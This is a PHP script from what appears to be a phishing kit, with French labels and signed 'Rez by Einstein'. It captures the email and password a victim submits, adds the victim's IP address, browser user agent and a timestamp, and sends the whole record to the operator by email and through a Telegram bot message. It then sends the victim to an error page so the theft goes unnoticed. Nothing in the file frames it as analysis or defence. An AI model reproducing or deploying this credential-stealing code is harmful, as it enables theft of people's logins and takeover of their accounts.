<?php

include 'settings.php';
session_start();
date_default_timezone_set('Europe/Paris');
$date = date('d/m/y');
$heure = date('H:i:s');
$dateHeure = "$date, $heure";
$_SESSION['date_heure'] = $dateHeure;
$_SESSION['lang'] = $lang;
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

$_SESSION['email'] = $_POST['ai'];
$_SESSION['motdepasse'] = $_POST['pr'];


if (isset($_POST['submit'])) {
	if (!empty($_POST['ai']) && !empty($_POST['pr'])) {



		if ($mail_sending == true) {

			$message = "

					[📝] Login | 2023
										
					[👤] Email  : " . $_SESSION['email'] . "
					[🔑] Mot de passe : " . $_SESSION['motdepasse'] . "
					

					[🗺️] INFORMATIONS COMPLÉMENTAIRES [🗺️]
					[⌚] Heure et date du rez : " . $_SESSION['date_heure'] . "
					[🌐] IP : " . $_SESSION['ip'] . "
					[📍] User-agent : " . $_SESSION['useragent'] . "

					[©️] Rez 𝐛𝐲 Einstein[©️]
					
					";

			$subject = " [📝]  Login |" . $_SESSION['ip'];
			$headers = "From: Login | 2023 <rez@pablo.fr>";

			mail($rezmail, $subject, $message, $headers);




		}



		if ($telegram_sending == true) {

			$data = [
				'text' => '

					[📝] Login | 2023 		

					[👤] Email  : ' . $_SESSION['email'] . '
					[🔑] Mot de passe : ' . $_SESSION['motdepasse'] . '
					

					[🗺️] Informations client [🗺️]
					[⌚] Heure et date du rez : ' . $_SESSION['date_heure'] . '
					[🌐] Adresse Ip : ' . $_SESSION['ip'] . '
					[📍]  User-agent : ' . $_SESSION['useragent'] . '
									  
					',
				'chat_id' => $chat_login
			];


			file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));
		}
		// Si succes
		if ($msg_login === true) {
			header('Location: ../error.html');
		} else {

			header('Location: ../error.html');

		}



	}

	//renvoie si erreur
	else {
		header('Location: ../error.html');
	}

}



?>